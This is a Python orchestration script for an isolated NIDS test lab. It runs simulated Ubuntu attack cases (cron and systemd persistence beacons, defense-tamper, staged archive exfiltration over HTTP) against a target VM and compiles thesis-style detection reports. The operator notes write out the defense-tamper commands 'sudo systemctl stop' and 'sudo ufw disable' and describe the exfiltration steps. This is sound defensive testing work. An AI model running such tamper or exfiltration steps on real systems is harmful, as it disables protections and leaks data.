            f"]({(local_result_dir / 'target_host_artifacts' / Path(artifact_path).name).as_posix()})"
        )

    lines.extend(
        [
            "",
            "## Defense-Side Sensor Evidence",
            "",
        ]
    )
    defense_titles = [
        ("Incident report", "incident_report"),
        ("Runtime database", "nids_db"),
        ("Alerts JSONL", "alerts_jsonl"),
        ("Flows JSONL", "flows_jsonl"),
        ("Threshold report", "threshold_report"),
    ]
    for title, key in defense_titles:
        artifact_path = summary["defense_artifacts"].get(key)
        if artifact_path:
            lines.append(f"- {title}: [{Path(artifact_path).name}]({Path(artifact_path).as_posix()})")

    md_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return json_path, md_path


def _write_phd_case_docx(
    local_result_dir: Path,
    *,
    attack_theme: str,
    attack_case: str,
    target_vm: str,
    defense_control: str,
    expected_rules: list[str],
    artifact_titles: list[tuple[str, str]],
    hardening_titles: list[tuple[str, str]],
    remote_artifacts: dict[str, str],
) -> Path:
    from docx import Document
    from docx.enum.text import WD_ALIGN_PARAGRAPH
    from docx.shared import Pt

    summary = json.loads((local_result_dir / "os_defense_summary.json").read_text(encoding="utf-8"))
    serious_report = (local_result_dir / "serious_test_report.md").read_text(encoding="utf-8")
    operator_note = (local_result_dir / "operator_note.md").read_text(encoding="utf-8")

    document = Document()
    normal_style = document.styles["Normal"]
    normal_style.font.name = "Times New Roman"
    normal_style.font.size = Pt(12)

    title = document.add_paragraph()
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    title_run = title.add_run("NIDS TestLab OS Defense Validation Report")
    title_run.bold = True
    title_run.font.size = Pt(16)

    subtitle = document.add_paragraph()
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    subtitle.add_run(f"Case: {attack_case}\n").bold = True
    subtitle.add_run(f"Run folder: {local_result_dir.name}\n")
    subtitle.add_run(f"Generated: {summary['generated_at']}")

    document.add_paragraph(
        "Abstract: This thesis-style evidence package documents an isolated Ubuntu operating-system defense experiment in the NIDS test lab. "
        "The goal was to validate that host attack activity on the target VM can be correlated with network evidence and corresponding NIDS detections on the separate sensor VM."
    )

    document.add_heading("1. Experimental Context", level=1)
    context_table = document.add_table(rows=0, cols=2)
    for label, value in [
        ("OS family", "ubuntu-linux"),
        ("Target VM", target_vm),
        ("Attack theme", attack_theme),
        ("Attack case", attack_case),
        ("Defense control", defense_control),
        ("Result status", summary["status"]),
        ("Total flows", str(summary["total_flows"])),
        ("Total alerts", str(summary["total_alerts"])),
        ("Evidence folder", str(local_result_dir)),
    ]:
        row = context_table.add_row().cells
        row[0].text = label
        row[1].text = value

    document.add_heading("2. Method", level=1)
    document.add_paragraph(
        "The case was executed only inside the isolated VirtualBox lab. The target host was configured with a temporary attack mechanism, the sensor VM ran the tuned live NIDS profile, and all resulting host and network artifacts were collected into a single evidence folder."
    )
    document.add_paragraph(
        "Expected detection path: " + ", ".join(expected_rules) + "."
    )
    document.add_paragraph(
        f"Attack strength: {summary.get('attack_strength', 'not recorded')}."
    )
    document.add_paragraph(
        f"Attack profile: {summary.get('attack_profile', 'not recorded')}."
    )

    document.add_heading("3. Observed Results", level=1)
    result_table = document.add_table(rows=1, cols=3)
    hdr = result_table.rows[0].cells
    hdr[0].text = "Observed Rule"
    hdr[1].text = "Count"
    hdr[2].text = "Matched Expected"
    observed_alerts = summary.get("observed_alerts", [])
    if observed_alerts:
        for item in observed_alerts:
            row = result_table.add_row().cells
            row[0].text = str(item["rule_name"])
            row[1].text = str(item["count"])
            row[2].text = "yes" if str(item["rule_name"]) in set(expected_rules) else "no"
    else:
        row = result_table.add_row().cells
        row[0].text = "none"
        row[1].text = "0"
        row[2].text = "no"

    document.add_paragraph(
        "Interpretation: "
        + (
            "the expected NIDS rule fired and the case is validated."
            if summary["status"] == "pass"
            else "the expected NIDS rule did not fire, so this case remains an open detection gap."
        )
    )

    document.add_heading("4. VM Hardening Evidence", level=1)
    for title_text, artifact_key in hardening_titles:
        artifact_path = remote_artifacts.get(artifact_key)
        if not artifact_path:
            continue
        document.add_paragraph(
            f"{title_text}: {local_result_dir / 'target_host_artifacts' / Path(artifact_path).name}"
        )
    vm_hardening_report = local_result_dir / "vm_hardening_profile.md"
    if vm_hardening_report.exists():
        document.add_paragraph(f"Consolidated hardening report: {vm_hardening_report}")

    document.add_heading("5. Attack-Side Host Evidence", level=1)
    for title_text, artifact_key in artifact_titles:
        artifact_path = remote_artifacts.get(artifact_key)
        if not artifact_path:
            continue
        document.add_paragraph(
            f"{title_text}: {local_result_dir / 'target_host_artifacts' / Path(artifact_path).name}"
        )

    document.add_heading("6. Defense-Side Sensor Evidence", level=1)
    for filename in ["serious_test_report.md", "nids.db", "alerts.jsonl", "flows.jsonl", "threshold_tuning.md"]:
        artifact_path = local_result_dir / filename
        if artifact_path.exists():
            document.add_paragraph(str(artifact_path))

    document.add_heading("7. Operator Note", level=1)
    for line in operator_note.splitlines():
        if line.strip():
            document.add_paragraph(line.strip())

    document.add_heading("8. Supporting Incident Summary", level=1)
    for line in serious_report.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        document.add_paragraph(stripped)

    output_path = local_result_dir / "phd_case_report.docx"
    document.save(output_path)
    return output_path


def _write_operator_note(local_result_dir: Path) -> Path:
    note_path = local_result_dir / "operator_note.md"
    note_path.write_text(
        "\n".join(
            [
                "# Operator Note",
                "",
                "This run simulated Ubuntu cron-based persistence followed by repeated scripted HTTP beacon execution inside the isolated VM lab.",
                "The target VM installed a temporary user crontab entry, executed the beacon script repeatedly for live validation, then removed the crontab entry after evidence capture.",
                "The goal was to prove that the defended sensor can still observe and alert on suspicious scripted network behavior that originates from a host-persistence mechanism.",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return note_path


def _write_systemd_operator_note(local_result_dir: Path) -> Path:
    note_path = local_result_dir / "operator_note.md"
    note_path.write_text(
        "\n".join(
            [
                "# Operator Note",
                "",
                "This run simulated Ubuntu systemd-based persistence followed by a scripted DNS beacon from the target VM to the isolated sensor VM.",
                "The target VM installed a temporary system service, enabled and started it, captured service state and journal evidence, and then removed the service after evidence collection.",
                "The goal was to prove that the defended sensor can observe and alert on persistence-driven DNS beacon activity while preserving host-side service artifacts for thesis citation.",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return note_path


def _write_defense_tamper_operator_note(local_result_dir: Path) -> Path:
    note_path = local_result_dir / "operator_note.md"
    note_path.write_text(
        "\n".join(
            [
                "# Operator Note",
                "",
                "This run simulated Linux defense-tamper behavior on the Ubuntu target by advertising `sudo systemctl stop` and `sudo ufw disable` over HTTP while stopping only a temporary guard service on the target for safe evidence capture.",
                "The target VM preserved attack-side artifacts such as the service unit, service-status snapshots, a stop-attempt transcript, and a firewall-disable simulation note.",
                "The sensor VM preserved defense-side artifacts such as the runtime database, alerts, flows, threshold report, and incident summary so the attack and defense views remain in one evidence package.",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return note_path


def _write_exfil_operator_note(local_result_dir: Path) -> Path:
    note_path = local_result_dir / "operator_note.md"
    note_path.write_text(
        "\n".join(
            [
                "# Operator Note",
                "",
                "This run simulated staged archive exfiltration from the Ubuntu target by creating local loot files, packaging them into a `tar.gz` archive, and sending the archive to the sensor over HTTP.",
                "The target VM preserved the staged file manifest, archive artifact, exfiltration sender script, and transfer log as attack-side evidence.",
                "The sensor VM preserved the runtime database, alerts, flows, threshold report, and incident summary as defense-side evidence, while the case report also records the VM hardening posture and attack strength.",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return note_path


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run Ubuntu OS-defense validation cases in the isolated VM lab.")
    parser.add_argument("--sensor-host", default="127.0.0.1")
    parser.add_argument("--sensor-port", type=int, default=2223)
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, default=2224)
    parser.add_argument("--username", default=lab_vm_username_default(), help="Lab VM username. Defaults to LAB_VM_USER.")
    parser.add_argument("--password", default=lab_vm_password_default(), help="Lab VM password. Defaults to LAB_VM_PASS.")
    parser.add_argument("--workspace", default="/opt/nids_workspace")
    parser.add_argument("--config-relpath", default="NIDS_TestLab/config/os_defense_profile.yml")
    parser.add_argument("--sensor-ip", default="10.77.0.30")
    parser.add_argument("--case", choices=["cron-http", "systemd-dns", "defense-tamper", "staged-http-exfil"], default="cron-http")
    parser.add_argument("--http-port", type=int, default=8080)
    parser.add_argument("--repeat-count", type=int, default=4)
    parser.add_argument("--repeat-delay-sec", type=float, default=0.9)
    parser.add_argument("--dns-count", type=int, default=80)
    parser.add_argument("--dns-delay-sec", type=float, default=0.12)
    parser.add_argument("--warmup-sec", type=float, default=5.0)
    parser.add_argument("--settle-sec", type=float, default=8.0)
    parser.add_argument("--run-name", default=f"ubuntu-os-cron-http-beacon-{_now_stamp()}")
    args = parser.parse_args(argv)
    require_lab_vm_credentials(parser, args)

    result_rel = posixpath.join("NIDS_TestLab", "results", args.run_name)
    local_result_dir = REPO_ROOT / "NIDS_TestLab" / "results" / args.run_name
    local_result_dir.mkdir(parents=True, exist_ok=True)

    sensor = _connect(args.sensor_host, args.sensor_port, args.username, args.password)
    target = _connect(args.target_host, args.target_port, args.username, args.password)

    http_server_pid: int | None = None
    udp_sink_pid: int | None = None
    runtime_pid: int | None = None
    remote_artifacts: dict[str, str] | None = None
    artifact_titles: list[tuple[str, str]] = []
    hardening_titles: list[tuple[str, str]] = [
        ("OS release", "os_release_path"),
        ("SSH hardening snapshot", "ssh_hardening_path"),
        ("UFW status snapshot", "ufw_status_path"),
        ("Listening sockets snapshot", "listening_sockets_path"),
        ("Enabled services snapshot", "enabled_services_path"),
    ]
    attack_case = ""
    attack_theme = "persistence"
    defense_control = ""
    expected_rules: list[str] = []
    attack_strength = "moderate"
    attack_profile = "single-case validation"
    docx_path: Path | None = None

    try:
        _sync_sensor_runtime(sensor, args.workspace, args.config_relpath, args.password)
        if args.case in {"cron-http", "defense-tamper", "staged-http-exfil"}:
            http_server_pid = _start_http_login_server(
                sensor,
                result_rel,
                port=args.http_port,
                sudo_password=args.password,
            )
            time.sleep(1)
        if args.case == "cron-http":
            attack_case = "cron persistence + suspicious HTTP beacon"
            defense_control = "isolated Ubuntu target with NIDS sensor observing scripted persistence-driven outbound traffic"
            expected_rules = ["HTTP Suspicious Keyword"]
            artifact_titles = [
                ("Script", "script_path"),
                ("Installed crontab", "installed_crontab_path"),
                ("Cleanup crontab", "cleanup_crontab_path"),
                ("Execution log", "log_path"),
                ("Tool used", "tool_path"),
            ]
            attack_strength = "moderate"
            attack_profile = "4 repeated HTTP beacon executions from a temporary cron entry against the isolated sensor helper"
        elif args.case == "systemd-dns":
            attack_case = "systemd persistence + DNS beacon"
            defense_control = "isolated Ubuntu target with NIDS sensor observing persistence-driven DNS beacon traffic from a temporary system service"
            expected_rules = ["DNS Burst / DGA-like Activity"]
            artifact_titles = [
                ("Service unit in remote case folder", "service_unit_remote_path"),
                ("Beacon script", "script_path"),
                ("Install state", "install_state_path"),
                ("Service status", "service_status_path"),
                ("Service journal", "journal_path"),
                ("Beacon log", "log_path"),
                ("Cleanup state", "cleanup_state_path"),
            ]
            attack_strength = "high"
            attack_profile = f"{int(args.dns_count)} DNS queries emitted from a temporary systemd service at {float(args.dns_delay_sec):.2f}s spacing"
        elif args.case == "defense-tamper":
            attack_theme = "defense-tamper"
            attack_case = "defense-tamper simulation + service-stop intent"
            defense_control = "isolated Ubuntu target with NIDS sensor observing explicit Linux defense-tamper commands while preserving safe host-side service-stop evidence"
            expected_rules = ["Linux Defense Tamper Command"]
            artifact_titles = [
                ("Attack script", "attack_script_path"),
                ("Tamper plan", "tamper_plan_path"),
                ("Temporary guard service unit", "service_unit_remote_path"),
                ("Guard service status before stop", "service_status_before_path"),
                ("Guard service stop attempt", "service_stop_attempt_path"),
                ("Guard service status after stop", "service_status_after_stop_path"),
                ("Firewall status before simulation", "firewall_status_before_path"),
                ("Firewall disable simulation note", "firewall_disable_simulation_path"),
                ("Attack log", "attack_log_path"),
                ("Cleanup state", "cleanup_state_path"),
            ]
            attack_strength = "high"
            attack_profile = f"{int(args.repeat_count)} explicit HTTP tamper requests plus a controlled stop of a temporary guard service; firewall disable remained simulated for lab safety"
        else:
            attack_theme = "exfiltration"
            attack_case = "staged archive exfiltration over HTTP"
            defense_control = "isolated Ubuntu target with NIDS sensor observing staged archive transfer attempts while preserving VM hardening posture and archive evidence"
            expected_rules = ["Linux Archive Exfiltration"]
            artifact_titles = [
                ("Staged file manifest", "manifest_path"),
                ("Archive artifact", "archive_path"),
                ("Exfiltration sender script", "attack_script_path"),
                ("Transfer log", "attack_log_path"),
                ("Cleanup note", "cleanup_note_path"),
            ]
            attack_strength = "high"
            attack_profile = f"{int(args.repeat_count)} repeated HTTP POST archive transfers using a staged tar.gz payload built from 3 files of 16384 bytes each"
        runtime_pid = _start_runtime(
            sensor,
            args.workspace,
            result_rel,
            config_relpath=args.config_relpath.replace("\\", "/"),
            sudo_password=args.password,
        )
        time.sleep(args.warmup_sec)

        if args.case == "cron-http":
            remote_artifacts = _prepare_remote_cron_http_case(
                target,
                sensor_ip=args.sensor_ip,
                http_port=args.http_port,
                run_name=args.run_name,
                repeat_count=args.repeat_count,
                repeat_delay_sec=args.repeat_delay_sec,
            )
        elif args.case == "systemd-dns":
            remote_artifacts = _prepare_remote_systemd_dns_case(
                target,
                sensor_ip=args.sensor_ip,
                run_name=args.run_name,
                dns_count=args.dns_count,
                dns_delay_sec=args.dns_delay_sec,
                sudo_password=args.password,
            )
        elif args.case == "defense-tamper":
            remote_artifacts = _prepare_remote_defense_tamper_case(
                target,
                sensor_ip=args.sensor_ip,
                http_port=args.http_port,
                run_name=args.run_name,
                repeat_count=args.repeat_count,
                repeat_delay_sec=args.repeat_delay_sec,
                sudo_password=args.password,
            )
            _execute_remote_defense_tamper_case(
                target,
                remote_base=remote_artifacts["remote_base"],
                service_name=remote_artifacts["service_name"],
                attack_script_path=remote_artifacts["attack_script_path"],
                service_status_after_stop_path=remote_artifacts["service_status_after_stop_path"],
                service_stop_attempt_path=remote_artifacts["service_stop_attempt_path"],
                firewall_disable_simulation_path=remote_artifacts["firewall_disable_simulation_path"],
                sudo_password=args.password,
            )
        else:
            remote_artifacts = _prepare_remote_http_exfil_case(
                target,
                sensor_ip=args.sensor_ip,
                http_port=args.http_port,
                run_name=args.run_name,
                repeat_count=args.repeat_count,
                repeat_delay_sec=args.repeat_delay_sec,
            )
            _execute_remote_http_exfil_case(
                target,
                attack_script_path=remote_artifacts["attack_script_path"],
            )
        remote_artifacts.update(
            _collect_remote_vm_hardening_snapshot(
                target,
                remote_base=remote_artifacts["remote_base"],
                sudo_password=args.password,
            )
        )
        post_attack_wait_sec = float(args.settle_sec)
        if args.case == "systemd-dns":
            post_attack_wait_sec = max(post_attack_wait_sec, float(args.dns_count) * float(args.dns_delay_sec) + 4.0)
        time.sleep(post_attack_wait_sec)
        if args.case == "cron-http":
            _cleanup_remote_cron_http_case(
                target,
                remote_base=remote_artifacts["remote_base"],
                marker=remote_artifacts["marker"],
            )
        elif args.case == "systemd-dns":
            _cleanup_remote_systemd_dns_case(
                target,
                remote_base=remote_artifacts["remote_base"],
                service_name=remote_artifacts["service_name"],
                service_unit_system_path=remote_artifacts["service_unit_system"],
                sudo_password=args.password,
            )
        elif args.case == "defense-tamper":
            _cleanup_remote_defense_tamper_case(
                target,
                remote_base=remote_artifacts["remote_base"],
                service_name=remote_artifacts["service_name"],
                service_unit_system_path=remote_artifacts["service_unit_system"],
                sudo_password=args.password,
            )
        else:
            _cleanup_remote_http_exfil_case(
                target,
                remote_base=remote_artifacts["remote_base"],
            )

        if http_server_pid not in {None, 0}:
            _stop_process(sensor, int(http_server_pid), sudo_password=args.password)
            http_server_pid = None
        if udp_sink_pid not in {None, 0}:
            _stop_process(sensor, int(udp_sink_pid), sudo_password=args.password)
            udp_sink_pid = None
        if runtime_pid is not None:
            _stop_runtime(sensor, int(runtime_pid), sudo_password=args.password)
            runtime_pid = None

        _chown_result_dir(sensor, args.workspace, result_rel, sudo_password=args.password)
        _generate_reports(sensor, args.workspace, result_rel)
        _collect_artifacts(sensor, args.workspace, result_rel, local_result_dir)
        _download_remote_artifacts(target, remote_artifacts, local_result_dir / "target_host_artifacts")
        _write_vm_hardening_report(
            local_result_dir,
            remote_artifacts=remote_artifacts,
            hardening_titles=hardening_titles,
            attack_strength=attack_strength,
            attack_profile=attack_profile,
        )
        _write_os_summary(
            local_result_dir,
            attack_theme=attack_theme,
            attack_case=attack_case,
            target_vm="nids-ubuntu-target",
            defense_control=defense_control,
            nids_expected_rules=expected_rules,
            remote_artifacts=remote_artifacts,
            artifact_titles=artifact_titles,
            hardening_titles=hardening_titles,
            attack_strength=attack_strength,
            attack_profile=attack_profile,
            fix_if_missed=(
                "Expand Linux downloader and persistence signatures or tune live capture if the suspicious HTTP beacon is missed."
                if args.case == "cron-http"
                else (
                    "Tune the DNS beacon service pacing or widen DNS burst/beacon features if the persistence-driven DNS case is missed."
                    if args.case == "systemd-dns"
                    else (
                        "Broaden Linux tamper signatures or adjust the HTTP helper path if the defense-tamper case is missed."
                        if args.case == "defense-tamper"
                        else "Broaden HTTP exfiltration signatures or add volume-based exfil logic if the staged archive case is missed."
                    )
                )
            ),
        )
        if args.case == "cron-http":
            _write_operator_note(local_result_dir)
        elif args.case == "systemd-dns":
            _write_systemd_operator_note(local_result_dir)
        elif args.case == "defense-tamper":
            _write_defense_tamper_operator_note(local_result_dir)
        else:
            _write_exfil_operator_note(local_result_dir)
        docx_path = _write_phd_case_docx(
            local_result_dir,
            attack_theme=attack_theme,
            attack_case=attack_case,
            target_vm="nids-ubuntu-target",
            defense_control=defense_control,
            expected_rules=expected_rules,
            artifact_titles=artifact_titles,
            hardening_titles=hardening_titles,
            remote_artifacts=remote_artifacts,
        )
    finally:
        if http_server_pid not in {None, 0}:
            try:
                _stop_process(sensor, int(http_server_pid), sudo_password=args.password)
            except Exception:
                pass
        if udp_sink_pid not in {None, 0}:
            try:
                _stop_process(sensor, int(udp_sink_pid), sudo_password=args.password)
            except Exception:
                pass
        if runtime_pid is not None:
            try:
                _stop_runtime(sensor, int(runtime_pid), sudo_password=args.password)
            except Exception:
                pass
        sensor.close()
        target.close()

    print(f"local_result_dir={local_result_dir}")
    print(f"report={local_result_dir / 'serious_test_report.md'}")
    print(f"os_summary={local_result_dir / 'os_defense_summary.md'}")
    if docx_path is not None:
        print(f"docx={docx_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
